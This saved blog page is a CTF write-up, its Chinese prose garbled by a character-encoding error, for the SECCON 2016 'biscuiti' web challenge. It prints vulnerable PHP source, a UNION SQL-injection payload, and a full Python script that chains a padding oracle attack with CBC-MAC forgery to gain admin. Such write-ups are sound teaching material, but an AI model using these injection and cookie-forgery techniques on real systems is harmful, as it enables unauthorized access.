<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./Seccon-CTF-2016-biscuiti-writeup/font-awesome.min.css" rel="stylesheet"/>
<link href="./Seccon-CTF-2016-biscuiti-writeup/screen.css" rel="stylesheet"/>
<link href="./Seccon-CTF-2016-biscuiti-writeup/prism_okaidia.css" rel="stylesheet"/>
<link href="./Seccon-CTF-2016-biscuiti-writeup/bendawang.css" rel="stylesheet"/>
<script src="./Seccon-CTF-2016-biscuiti-writeup/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">å½’æ¡£</a></li>
<li class="">
<a href="/time">æ—¶é—´</a></li>
<!--<li class="">
            <a href="/category">æ ‡ç­¾</a></li>-->
<li class="">
<a href="/friendlink">å‹é“¾</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./Seccon-CTF-2016-biscuiti-writeup/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./Seccon-CTF-2016-biscuiti-writeup/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">å½’æ¡£</a></li>
<li class="">
<a href="/time">æ—¶é—´</a></li>
<!--<li class="">
            <a href="/category">æ ‡ç­¾</a></li>-->
<li class="">
<a href="/friendlink">å‹é“¾</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--ç§»åŠ¨ç«¯-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>æ–‡ç« </span>
</div>
<div class="article-info-block">
               5
               <span>æ ‡ç­¾</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=æœ‰äº‹Qæˆ‘&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="æ”¶èµ·">ç›®å½•[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="secconctf2016biscuitiwriteup">Seccon-CTF-2016-biscuiti-writeup</h1>
<p style="max-width:100%;height:auto;">é™„dalaoé“¾æ¥ï¼šhttps://blog.tinduong.pw/2016/12/11/seccon-quals-2016-biscuiti-web-crypto-300-write-up/
å…¶ä»–é¢˜ç›®çš„wpå†™åœ¨å¦ä¸€ç¯‡æ–‡ç« é‡Œé¢ï¼šhttp://blog.csdn.net/qq_19876131/article/details/53675162</p>
<h1 id="web300biscuiti">web300 biscuiti</h1>
<p style="max-width:100%;height:auto;">è¿™é“é¢˜æˆ‘å•ç‹¬æŒ‘å‡ºæ¥å‘åšå®¢ï¼Œå› ä¸ºæŠ˜è…¾äº†æˆ‘å¿«ä¸€å¤©ï¼Œè€Œä¸”é‡åˆ°çš„é—®é¢˜éƒ½æ˜¯ç»å¯¹ä¸è¯¥çŠ¯çš„é”™è¯¯ï¼ŒçœŸæ˜¯æš´èºï¼Œä¸è¿‡é¢˜ç›®è´¨é‡æœ¬èº«è¿˜æ˜¯ç›¸å½“é«˜çš„ã€‚
ä¸€é“web+padding oracleçš„é¢˜ç›®ã€‚ä½†æ˜¯æˆ‘çš„å¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨è°ƒè‡ªå·±çš„è„šæœ¬ä¸Šäº†ï¼Œæš´éœ²å‡ºå¹³æ—¶å†™ä»£ç çš„ä¹ æƒ¯å¤ªå·®äº†ï¼Œå„ç§ç»†èŠ‚é—®é¢˜æ¥äºŒè¿ä¸‰ã€‚çœŸæ˜¯çˆ†ç‚¸</p>
<p style="max-width:100%;height:auto;">é¦–å…ˆæ‹¿åˆ°æºç ï¼Œæœ¬åœ°çš„sqliteç¯å¢ƒæœ‰ç‚¹é—®é¢˜ï¼Œæ€ä¹ˆä¹Ÿè¿ä¸ä¸Šï¼Œæ‰€ä»¥ç®€å•æ”¹äº†æ”¹æ¢æˆäº†mysqlã€‚åº”è¯¥å½±å“ä¸å¤§å§ã€‚ã€‚å¤§æ¦‚ã€‚ã€‚ã€‚</p>
<p style="max-width:100%;height:auto;">ç®€å•æ”¹æˆmysqlæ•°æ®åº“åæºç å¦‚ä¸‹ï¼š</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
error_reporting(0);
define("ENC_KEY", "abcdcensoreddefg");
define("ENC_METHOD", "aes-128-cbc");
if (!extension_loaded(&amp;apos;pdo_sqlite&amp;apos;)) {
    header("Content-type: text/plain");
    echo "PDO Driver for SQLite is not installed.";
    exit;
}
if (!extension_loaded(&amp;apos;openssl&amp;apos;)) {
    header("Content-type: text/plain");
    echo "OpenSSL extension is not installed.";
    exit;
}
/*
Setup:
CREATE TABLE user (
username VARCHAR(255),
enc_password VARCHAR(255),
isadmin BOOLEAN
);
INSERT INTO user VALUES ("admin", "***censored***", 1);
*/
// åŠ å¯†ä¹‹åbase64
function auth($enc_password, $input) {
    $enc_password = base64_decode($enc_password);
    $iv = substr($enc_password, 0, 16);
    $c = substr($enc_password, 16);
    #echo $c."&lt;br&gt;".$v;
    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
    return $password == $input;
}
function mac($input) {
    $iv = str_repeat("\0", 16);
    $c = openssl_encrypt($input, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);
    return substr($c, -16);
}
function save_session() {
    global $SESSION;
    $j = serialize($SESSION);
    $u = $j . mac($j);
    setcookie("JSESSION", base64_encode($u));
}
function load_session() {
    global $SESSION;
    if (!isset($_COOKIE["JSESSION"]))
        return array();
    $u = base64_decode($_COOKIE["JSESSION"]);
    $j = substr($u, 0, -16);
    $t = substr($u, -16);
    if (mac($j) !== $t)
        return array(2);
    $SESSION = unserialize($j);
    //a:3:{s:4:"name";s:9:"bendawang";s:7:"isadmin";s:1:"1";s:8:"password";s:27:"bendawangbendawangbendawang";}
}
function _h($s) {
    return htmlspecialchars($s, ENT_QUOTES, "UTF-8");
}
function mysql_conn()
{
    $conn=@mysql_connect(&amp;apos;localhost&amp;apos;,&amp;apos;root&amp;apos;,&amp;apos;1&amp;apos;) or die(&amp;apos;could not connect&amp;apos;.mysql_error());
    mysql_query(&amp;apos;use test&amp;apos;);
    mysql_query("SET character_set_connection=utf8, character_set_results=utf8,character_set_client=utf8", $conn);
    return $conn;
}

function login_page($message = NULL) {
?&gt;&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;?php
    if (isset($message)) {
        echo "  &lt;div&gt;" . _h($message) . "&lt;/div&gt;\n";
    }
?&gt;
  &lt;form method="POST"&gt;
    &lt;div&gt;
      &lt;label&gt;username&lt;/label&gt;
      &lt;input type="text" name="username"&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;label&gt;password&lt;/label&gt;
      &lt;input type="password" name="password"&gt;
    &lt;/div&gt;
    &lt;input type="submit" value="login"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
      exit;
}
function info_page() {
    global $SESSION;
?&gt;&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;?php
    printf("Hello %s\n", _h($SESSION["name"]));
    if ($SESSION["isadmin"])
        echo &amp;apos;get flag!!&amp;apos;;
?&gt;
&lt;div&gt;&lt;a href="logout.php"&gt;Log out&lt;/a&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php
      exit;
}
if (isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;password&amp;apos;])) {
    $username = (string)$_POST[&amp;apos;username&amp;apos;];
    $password = (string)$_POST[&amp;apos;password&amp;apos;];
    $dbh =mysql_conn();
    #echo "SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;";
    $result = mysql_query("SELECT username, enc_password from user WHERE username=&amp;apos;{$username}&amp;apos;");
    if (!$result) {
        login_page("error");
        /* DEBUG
        $info = $dbh-&gt;errorInfo();
        login_page($info[2]);
        //*/
    }
    $u = mysql_fetch_array($result);
    if ($u &amp;&amp; auth($u["enc_password"], $password)) {
        $SESSION["name"] = $u[&amp;apos;username&amp;apos;];
        $SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];
        save_session();
        info_page();
    }
    else {
        login_page("error");
    }
}
else {
    load_session();
    if (isset($SESSION["name"])) {
        info_page();
    }
    else {
        login_page();
    }
}
</code></pre>
<p style="max-width:100%;height:auto;">åŠŸèƒ½å¤§æ¦‚æ€»ç»“ä¸‹ï¼š</p>
<ul>
<li>1ã€é¦–å…ˆå¦‚æœæ­£å¸¸ç™»é™†é€šè¿‡æŸ¥è¯¢<code style="max-width:100%;height:auto;">queryï¼ˆâ€œSELECT usernameï¼Œenc_password from user WHERE username =&amp;apos;{$ username}&amp;apos;â€ï¼‰</code>ä»æ•°æ®åº“æ£€ç´¢ç”¨æˆ·åå’Œç›¸åº”çš„åŠ å¯†å¯†ç ï¼Œå…¶ä¸­åŠ å¯†å¯†ç æ ¼å¼æ˜¯<code style="max-width:100%;height:auto;">IV||cipher</code></li>
<li>2ã€ç™»é™†ç»“æœæ˜¯<code style="max-width:100%;height:auto;">AES-128-CBC</code>è§£å¯†enc_passwordï¼Œç„¶åä¸è¾“å…¥è¿›è¡Œå¯¹æ¯”ã€‚ç™»é™†æˆåŠŸçš„è¯ä¼šåˆå§‹åŒ–<code style="max-width:100%;height:auto;">$SESSION</code>æ•°ç»„</li>
<li>3ã€<code style="max-width:100%;height:auto;">COOKIE</code>çš„æ ¼å¼ï¼Œ<ul>
<li><code style="max-width:100%;height:auto;">$j = serialize($SESSION)</code></li>
<li><code style="max-width:100%;height:auto;">JSESSION =base64_encode( $j || MAC($j) )</code></li>
<li>macå‡½æ•°æ˜¯ä»¥16ä¸ªç©ºå­—èŠ‚ä¸º<code style="max-width:100%;height:auto;">IV</code>åŠ å¯†è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¿”å›åŠ å¯†ç»“æœçš„å16ä½ã€‚</li></ul></li>
<li>4ã€å½“<code style="max-width:100%;height:auto;">$SESSION[â€œisadminâ€]</code>ä¸ºçœŸçš„æ—¶å€™æˆ‘ä»¬ä¼šè·å–åˆ°<code style="max-width:100%;height:auto;">flag</code></li>
</ul>
<p style="max-width:100%;height:auto;">æ‰€ä»¥å¤§æ¦‚ç›®çš„ä¹Ÿå°±æ˜ç¡®äº†ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ ä½¿å¾—æˆ‘ä»¬çš„<code style="max-width:100%;height:auto;">$SESSION[â€œisadminâ€]</code>çš„å€¼ä¸ºçœŸã€‚</p>
<h2 id="0x01sqli">0x01 å­˜åœ¨sqli</h2>
<p style="max-width:100%;height:auto;">é¦–å…ˆæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹åˆ°è¾“å…¥çš„ç‚¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¹Ÿå°±æ„å‘³ç€å­˜åœ¨sqlæ³¨å…¥ï¼Œå¹¶ä¸”ç™»é™†çš„æ—¶å€™æ˜¯ä¼šè§¦å‘è§£å¯†è¿‡ç¨‹çš„ï¼Œè€Œä¸”sqlæ³¨å…¥ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡è”åˆæ³¨å…¥æ§åˆ¶æŸ¥è¯¢è¿”å›çš„ç»“æœï¼Œè¿™ä¹Ÿå°±æ»¡è¶³padding oracleçš„æ¡ä»¶ã€‚
æ¯”å¦‚æˆ‘ä»¬è¾“å…¥å¦‚ä¸‹çš„å€¼ï¼š(è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬çš„ç”¨æˆ·åé•¿åº¦ç›¸å½“é•¿ï¼Œå¾…ä¼šå„¿ä¼šè§£é‡Šä¸ºä»€ä¹ˆè¦è®¾å®šä¸ºè¿™ä¹ˆé•¿)</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">username=&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;bendawang&amp;password=
</code></pre>
<p style="max-width:100%;height:auto;">ä½¿å¾—<code style="max-width:100%;height:auto;">password</code>ä¸ºç©ºï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šè§¦å‘è§£å¯†è¿‡ç¨‹</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">function auth($enc_password, $input) {     //`$enc_password`å³ä½¿`bendawang`,è€Œ$inputåˆ™ä¸ºç©º
    $enc_password = base64_decode($enc_password);     
    $iv = substr($enc_password, 0, 16);
    $c = substr($enc_password, 16);
    #echo $c."&lt;br&gt;".$v;
    $password = openssl_decrypt($c, ENC_METHOD, ENC_KEY, OPENSSL_RAW_DATA, $iv);     //è§£å¯†å¤±è´¥ï¼Œè¿”å›ç©ºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶`IV`å’Œ`cipher`ï¼Œå­˜åœ¨`padding_oracle_attack`
    return $password == $input;    //ç”±äºè§£å¯†å¤±è´¥ï¼Œç©ºç­‰äºç©ºï¼ŒéªŒè¯é€šè¿‡ï¼ï¼ï¼
}
</code></pre>
<p style="max-width:100%;height:auto;">è¿™æ ·æˆ‘ä»¬å°±èƒ½æ­£å¸¸ç™»é™†ä¸Šå»ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•è·å–åˆ°<code style="max-width:100%;height:auto;">flag</code>ï¼Œå› ä¸ºè”åˆæŸ¥è¯¢æ— æ³•æ§åˆ¶<code style="max-width:100%;height:auto;">$SESSION["isadmin"] = $u[&amp;apos;isadmin&amp;apos;];</code>
ä½†æ˜¯é€šè¿‡ä¸Šé¢çš„pocï¼Œæˆ‘ä»¬èƒ½å¤Ÿè·å–åˆ°ä¸€ä¸ªcookieå€¼ã€‚</p>
<p style="max-width:100%;height:auto;"><br/><img alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°" data-action="zoom" src="./Seccon-CTF-2016-biscuiti-writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="0x02cookie">0x02 cookieå€¼</h2>
<p style="max-width:100%;height:auto;">ä¸‹é¢çš„å‡½æ•°æ˜¯å¯¹cookieå€¼çš„å¤„ç†ã€‚</p>
<pre><code class="php language-php" style="max-width:100%;height:auto;">function load_session() {
    global $SESSION;
    if (!isset($_COOKIE["JSESSION"]))
        return array();
    $u = base64_decode($_COOKIE["JSESSION"]);
    $j = substr($u, 0, -16);
    $t = substr($u, -16);
    if (mac($j) !== $t)
        return array(2);
    $SESSION = unserialize($j);
}
</code></pre>
<p style="max-width:100%;height:auto;">æ ¹æ®<code style="max-width:100%;height:auto;">0x01</code>æˆ‘ä»¬æ‹¿åˆ°çš„ä¸€ä¸ª<code style="max-width:100%;height:auto;">cookie</code>ï¼Œbase64è§£ç åå¦‚ä¸‹ï¼š</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";N;}F
ÃÃœGÂƒ6RÂšÂÃ§Ã¨
</code></pre>
<p style="max-width:100%;height:auto;">æˆ‘ä»¬å·²çŸ¥çš„cookieå€¼çš„æ ¼å¼</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">$j = serialize($SESSION)
JSESSION =base64_encode( $j || MAC($j) )
</code></pre>
<h2 id="0x03">0x03 å¼€å§‹æäº‹</h2>
<p style="max-width:100%;height:auto;">ç°åœ¨ï¼Œæˆ‘ä»¬çš„ç›®çš„å·²ç»æ˜ç¡®äº†ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•è·å–åˆ°å¯†é’¥çš„ï¼Œæ‰€ä»¥è¿™ä¹Ÿå°±å†³å®šäº†æˆ‘ä»¬åªèƒ½é€šè¿‡å¦ä¸€ç§æ–¹å¼ä¿®æ”¹cookieçš„å€¼ç„¶åæäº¤ï¼Œä½¿å¾—éªŒè¯é€šè¿‡å¹¶ä¸”ä½¿<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>ã€‚
é¦–å…ˆæˆ‘ä»¬å·²çŸ¥ä»€ä¹ˆï¼Œå·²çŸ¥AESåŠ å¯†çš„æ—¶å€™å—çš„å¤§å°N=16ã€‚
æˆ‘ä»¬æœ‰ä¸€ä¸ªcookieå€¼ï¼Œå³æˆ‘ä»¬çŸ¥é“å…¨éƒ¨çš„æ˜æ–‡ä¸²ï¼Œè¿˜æœ‰æœ€åä¸€å—æ˜æ–‡è¢«åŠ å¯†çš„åˆ°çš„å¯†æ–‡å—
å…ˆæŠŠæ˜æ–‡åˆ†å—å¦‚ä¸‹ï¼š</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">P0ï¼ša:2:{s:4:"name";     ----&gt; C0
P1ï¼šs:27:"bendawangb     ----&gt; C1
P2ï¼šendawangbendawan     ----&gt; C2
P3ï¼šg";s:7:"isadmin"     ----&gt; C3
P4ï¼š;N;}                 ----&gt; C4 ï¼ˆå·²çŸ¥ï¼Œcookieçš„æœ«16ä½ï¼‰
</code></pre>
<p style="max-width:100%;height:auto;">å¦‚ä¸Šå¦‚æ‰€ç¤ºï¼Œæˆ‘ä»¬å·²çŸ¥ä¸€å—çš„å¯†æ–‡ï¼ŒåŠ ä¸Šæ‰€æœ‰çš„æ˜æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code style="max-width:100%;height:auto;">padding_oracle</code>æ¢å¤æ‰€æœ‰çš„å¯†æ–‡å—ï¼Œç”±äºsqlæ³¨å…¥ç‚¹ï¼Œæˆ‘ä»¬å¯æ§ï¼Œæ—¢å¯ä»¥æ§åˆ¶è¢«è§£å¯†çš„å­—ç¬¦ä¸²ã€‚</p>
<blockquote>
<p style="max-width:100%;height:auto;">è¿™é‡Œä¸è®²padding<em>oracleçš„å…·ä½“åŸç†äº†ï¼Œéœ€è¦çš„ç«¥é‹å¯ä»¥çœ‹æˆ‘å†™çš„å¦ä¸€ç¯‡blogï¼šhttp://blog.csdn.net/qq</em>19876131/article/details/52674589
  æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é‚£é‡Œè¿›è¡Œ<code style="max-width:100%;height:auto;">padding_oracle_attack</code>ï¼Œç„¶åä»¥èƒ½å¦æˆåŠŸç™»é™†åˆ¤æ–­æ˜¯å¦è§£å¯†æˆåŠŸ(PS:è¾“å…¥çš„<code style="max-width:100%;height:auto;">password</code>è¦ä¸ºç©º)ï¼Œå¦‚æœè§£å¯†å¤±è´¥ï¼Œå°±èƒ½ç™»é™†æˆåŠŸï¼Œå¦åˆ™ç™»å½•å¤±è´¥ã€‚
  è¿™æ ·æˆ‘ä»¬æœ‰äº†å…¨éƒ¨çš„å¯†æ–‡å—ã€‚
  ç›¸å½“äºæˆ‘ä»¬å·²çŸ¥äº†å…¨éƒ¨çš„<code style="max-width:100%;height:auto;">P0-P4</code>å’Œ<code style="max-width:100%;height:auto;">C0-C4</code>
  ç°åœ¨è¿›å…¥åˆ°é‡å¤´æˆã€‚
  æ€ä¹ˆè¦ä½¿<code style="max-width:100%;height:auto;">P4</code>çš„å€¼ä»<code style="max-width:100%;height:auto;">P4 = ";N;}"</code>å˜æˆ<code style="max-width:100%;height:auto;">P4&amp;apos; = ";b:1;}"</code>ï¼Œå¹¶ä¸”ä¿®æ”¹<code style="max-width:100%;height:auto;">C4</code>ä¸ºå¤šå°‘çš„æ—¶å€™ï¼Œä½¿å…¶èƒ½å¤Ÿæ­£å¸¸è§£å¯†ï¼Œä»è€Œååºåˆ—åŒ–ä¹‹å<code style="max-width:100%;height:auto;">$SESSION[&amp;apos;isadmin&amp;apos;]=1</code>ã€‚</p>
</blockquote>
<p style="max-width:100%;height:auto;">å…ˆæ¥çœ‹çœ‹æˆ‘ä»¬çš„<code style="max-width:100%;height:auto;">P2</code>ï¼Œä¸çŸ¥é“å¤§å®¶çœ‹å‡ºæ¥æ²¡æœ‰ï¼Œæ•´ä¸ª<code style="max-width:100%;height:auto;">P2</code>å—éƒ½æ˜¯åŸåºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œé¢çš„å­—ç¬¦ä¸²æ ¼å¼çš„ä¸œè¥¿ï¼Œè¿™ä¹Ÿå°±è§£é‡Šäº†æˆ‘ä»¬ä¸ºä»€ä¹ˆæœ€åˆç™»é™†çš„æ—¶å€™ç”¨æˆ·åè¦ç›¸å½“é•¿æ‰è¡Œã€‚è¿™æ ·å­æˆ‘ä»¬çš„<code style="max-width:100%;height:auto;">P2</code>æˆ‘ä»¬å¯ä»¥éšä¾¿ä¿®æ”¹ï¼Œåªè¦æœ€åèƒ½å¤Ÿæ­£å¸¸è§£å¯†ï¼Œé‚£ä¹ˆå®ƒéƒ½ä¸ä¼šå½±å“ååºåˆ—åŒ–çš„ç»“æœã€‚
è¿™é‡Œæˆ‘ä»¬å…ˆä¿®æ”¹<code style="max-width:100%;height:auto;">P2</code>çš„å€¼å¦‚ä¸‹ï¼š</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1     //å¾…ä¼šå°±çŸ¥é“ä¸ºä»€ä¹ˆä¼šä¿®æ”¹æˆè¿™ä¸ªå€¼
</code></pre>
<p style="max-width:100%;height:auto;">ç„¶åæˆ‘ä»¬ä¿æŒå…¶ä»–åœ°æ–¹éƒ½ä¸å˜çš„è¯ï¼Œç„¶åé‡æ–°å‘é€è¯·æ±‚å¾—åˆ°æ–°çš„<code style="max-width:100%;height:auto;">cookie</code>å€¼ï¼ŒåŒæ ·é€šè¿‡<code style="max-width:100%;height:auto;">padding_oracle</code>æˆ‘ä»¬èƒ½å¤Ÿæ¢å¤å‡ºæ–°çš„<code style="max-width:100%;height:auto;">C2â€™</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆå®¹æ˜“èƒ½å¤Ÿçœ‹å‡ºæ¥ï¼Œç”¨æ–°çš„<code style="max-width:100%;height:auto;">P2&amp;apos;</code>åŠ å¯†ï¼Œä½†æ˜¯<code style="max-width:100%;height:auto;">C0</code>å’Œ<code style="max-width:100%;height:auto;">C1</code>æ˜¯ä¸ä¼šå˜åŒ–çš„ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬ä¸€å€¼<code style="max-width:100%;height:auto;">C2â€™</code>çš„å€¼æ˜¯æ€ä¹ˆå¾—æ¥çš„</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">ç”±äºæ˜¯CBCæ¨¡å¼
C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
ç”±ä¸Šå·²çŸ¥
P2&amp;apos; = P4&amp;apos; ^ C3 ^ C1
æ‰€ä»¥
C2&amp;apos; = Encrypto( P2&amp;apos; ^ C1 )
    = Encrypto(P4&amp;apos; ^ C3 ^ C1 ^ C1)
    = Encrypto(P4&amp;apos; ^ C3 )
</code></pre>
<p style="max-width:100%;height:auto;">æœ‰äº†ä¸Šé¢çš„å¼å­ï¼Œæˆ‘ä»¬å†é‡æ–°æ¥ï¼Œè¿™æ¬¡ä¸ä¿®æ”¹<code style="max-width:100%;height:auto;">P2</code>äº†ï¼Œè¿™æ¬¡æˆ‘ä»¬åªä¿®æ”¹<code style="max-width:100%;height:auto;">P4</code>ä¸º<code style="max-width:100%;height:auto;">P4&amp;apos;</code></p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">ç”±äºæ˜¯CBCæ¨¡å¼
C4&amp;apos;=Encrypto( P4&amp;apos; ^ C3 )=C2&amp;apos;
</code></pre>
<p style="max-width:100%;height:auto;">æ‰€ä»¥è¿™å°±å‡ºæ¥äº†ï¼Œæˆ‘ä»¬åªä¿®æ”¹<code style="max-width:100%;height:auto;">P4</code>å¯¹åº”æ–°çš„C4â€™å’Œåªä¿®æ”¹<code style="max-width:100%;height:auto;">P2</code>æ¢å¤å‡ºçš„<code style="max-width:100%;height:auto;">C2&amp;apos;</code>æ˜¯ç›¸ç­‰çš„ï¼Œé‚£ä¹ˆè¿™å°±æå®šäº†ã€‚</p>
<h2 id="0x04">0x04 ä»£ç </h2>
<p style="max-width:100%;height:auto;">å°±å‰©å†™ä»£ç ï¼Œä¸‹é¢é™„ä¸Šæˆ‘è‡ªå·±å†™çš„ä»£ç ï¼Œå†™çš„å¾ˆæŒ«ï¼Œè€Œä¸”ä¸­é—´çŠ¯äº†å„å¼å„æ ·å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯ï¼Œè¿˜æ˜¯è‡ªå·±çš„ä»£ç ä¹ æƒ¯å¤ªå·®äº†ï¼Œæ…¢æ…¢æ”¹æ­£æŠŠ</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;"># encoding:utf-8
import requests
import base64
url=&amp;apos;http://biscuiti.pwn.seccon.jp/&amp;apos;
N=16
def inject(password):
    param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangbendawangbendawang&amp;apos;,&amp;apos;{password}".format(password=password),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
    result=requests.post(url,data=param)
    return result
def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)
def padding_oracle(N,cipher,plaintext):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=&amp;apos;a&amp;apos;*(16-i)+chr(j)+padding+cipher
            result=inject(base64.b64encode(chr(0)*16+c))
            if "Hello" not in result.content:
                get=chr(j^i)+get
                print get.encode(&amp;apos;hex&amp;apos;)
                break
    return xor(get,plaintext)

jsession=inject("bendawang").headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
serialize=jsession[:-16]
print serialize
p=[]
for i in xrange(0,len(serialize),16):
    p.append(serialize[i:i+16])
l=len(p)
p[l-1]=pad(p[l-1],N)
c=[""]*l
c[l-1]=jsession[-16:]
for i in xrange(l-1,0,-1):
    c[i-1]=padding_oracle(N,c[i],p[i])
#c=[&amp;apos;\x88\xbb|I1e\x1c\xb9u\xe4\x8e\x90\x08\xc1\xa9\x11&amp;apos;, &amp;apos;sd\x0c2\x13i\xac\xfd\x16\x9e\xa8\xc5?\x07/\xe5&amp;apos;, &amp;apos;&gt;\xbfZX\xda\x10\x99^\xd9\xa3\x15\xa9\\Q-\x9e&amp;apos;, &amp;apos;\xf5;\xc6\x1cn\x0f\xe5\x1bJ{\x08\x00\xbd\x8d\x17\x18&amp;apos;, &amp;apos;\xd0PP\xbfK\x8b:\x12\xaa\xa8Et\x83\x12T\xe7&amp;apos;]
p[4]=pad(&amp;apos;;b:1;}&amp;apos;,N)
p[2]=xor(xor(c[3],p[4]),c[1])
param={&amp;apos;username&amp;apos;:"&amp;apos; union select &amp;apos;bendawangb{new_p}g&amp;apos;,&amp;apos;bendawang".format(new_p=p[2]),&amp;apos;password&amp;apos;:&amp;apos;&amp;apos;}
result=requests.post(url,data=param)
#print p
jsession=result.headers[&amp;apos;set-cookie&amp;apos;].split(&amp;apos;=&amp;apos;)[1].replace("%3D",&amp;apos;=&amp;apos;).replace("%2F",&amp;apos;/&amp;apos;).replace("%2B",&amp;apos;+&amp;apos;).decode(&amp;apos;base64&amp;apos;)
print c
c=[""]*l
serialize=jsession[:-16]
p=[]
for i in xrange(0,len(serialize),16):
    p.append(serialize[i:i+16])
#print p
p[l-1]=pad(p[l-1],N)
c[l-1]=jsession[-16:]
for i in xrange(l-1,1,-1):
    c[i-1]=padding_oracle(N,c[i],p[i])
print c
new_jsession=base64.b64encode(&amp;apos;a:2:{s:4:"name";s:27:"bendawangbendawangbendawang";s:7:"isadmin";b:1;}&amp;apos;+c[2])
header = {"Cookie":"JSESSION="+new_jsession}
r = requests.post(url, headers=header)
print r.content
</code></pre>
<p style="max-width:100%;height:auto;">è¿è¡Œæˆªå›¾å¦‚ä¸‹ï¼š
